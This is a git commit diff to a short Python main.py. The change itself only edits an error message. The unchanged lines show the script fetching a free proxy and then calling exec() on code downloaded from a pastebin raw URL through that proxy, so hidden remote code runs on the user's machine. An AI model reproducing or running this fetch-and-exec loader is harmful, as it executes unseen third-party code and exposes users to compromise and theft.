f75c652d24d10a2937abbbf56c98a941a5c7d6cb
Bruno Parziovanni <70079144+Kiny-Kiny@users.noreply.github.com>
2021-08-18 12:37:38 -0300

    Update main.py

--- main.py
+++ main.py
@@ -2,4 +2,4 @@ from os import execl; from sys import executable; from os import system
 try: from requests import get
 except: system('python3 -m pip install --upgrade pip && pip3 install requests');execl(executable, executable, *argv)
 try: api=get('http://pubproxy.com/api/proxy').json();ip=api['data'][0]['ip']+':'+api['data'][0]['port'];exec(get(url='https://pastebin.com/raw/WY6AQRKa', proxies={'http': ip}).text)
-except Exception as error: system('cls');system('clear');print('Verifique sua conexão a internet!' +str(error))
+except Exception as error: system('cls');system('clear');print('Verifique sua conexão a internet!\n' +str(error))
